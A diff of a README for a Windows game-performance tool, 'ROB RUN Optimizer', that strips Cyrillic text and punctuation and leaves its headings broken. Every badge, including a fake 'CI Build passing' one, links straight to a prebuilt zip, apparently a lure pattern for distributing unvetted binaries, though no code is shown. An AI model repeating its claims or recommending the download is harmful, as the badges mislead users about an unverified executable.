@@ -1,15 +1,15 @@
 <div align="center">
 
-# ROB RUN Optimizer — ROB RUN Optimizer — FPS Boost, Снижение Пинга и Анти-фриз Профили (One-Command Setup, Prebuilt Release)
+# ROB RUN Optimizer ROB RUN Optimizer FPS Boost, - (One-Command Setup, Prebuilt Release)
 
-<p><strong>ROB RUN Optimizer — ROB RUN Optimizer — FPS Boost, Снижение Пинга и Анти-фриз Профили (One-Command Setup, Prebuilt Release): ROB RUN плавнее и быстрее. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>
+<p><strong>ROB RUN Optimizer ROB RUN Optimizer FPS Boost, - (One-Command Setup, Prebuilt Release): ROB RUN . Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>
 
 [![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/rob-run-performance-v0.1.0-win64.zip)
 [![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/rob-run-performance-v0.1.0-win64.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/rob-run-performance-v0.1.0-win64.zip)
 [![Stars](https://img.shields.io/github/stars/XeheniJog74/rob-run-performance?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)
 
-<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
+<p><strong> No compiler. No setup. Grab the prebuilt package and run.</strong></p>
 
 <a href="../../releases/download/v0.1.0/rob-run-performance-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download rob-run-performance-v0.1.0-win64.zip" width="520"></a>
 
@@ -23,7 +23,7 @@
 
 ## Executive Summary & Design
 
-**ROB RUN Optimizer — ROB RUN плавнее и быстрее** (`rob-run-performance`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.
+**ROB RUN Optimizer ROB RUN ** (`rob-run-performance`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.
 
 ## Getting Started (No Compiler Needed)
 
@@ -48,36 +48,36 @@
 
 ```json
 {
-  "module": "rob-run-performance",
-  "version": "0.1.0",
-  "runtime": {
-    "threads": 4,
-    "verbose": false,
-    "hot_reload": true
-  },
-  "modules": {
-    "tuner": {
-      "enabled": true
-    },
-    "network": {
-      "enabled": true
-    },
-    "profiles": {
-      "enabled": true
-    },
-    "cli": {
-      "enabled": true
-    }
-  }
+ "module": "rob-run-performance",
+ "version": "0.1.0",
+ "runtime": {
+ "threads": 4,
+ "verbose": false,
+ "hot_reload": true
+ },
+ "modules": {
+ "tuner": {
+ "enabled": true
+ },
+ "network": {
+ "enabled": true
+ },
+ "profiles": {
+ "enabled": true
+ },
+ "cli": {
+ "enabled": true
+ }
+ }
 }
 ```
 
 ## Documentation & Guides
 
-- [Usage Guide — commands and options](docs/USAGE.md)
-- [FAQ — platform support, data storage](docs/FAQ.md)
-- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
-- [Changelog — v0.1.0 and later](CHANGELOG.md)
+- [Usage Guide commands and options](docs/USAGE.md)
+- [FAQ platform support, data storage](docs/FAQ.md)
+- [Contributing setup, ground rules, PR flow](CONTRIBUTING.md)
+- [Changelog v0.1.0 and later](CHANGELOG.md)
 
 ## Building from Source
 
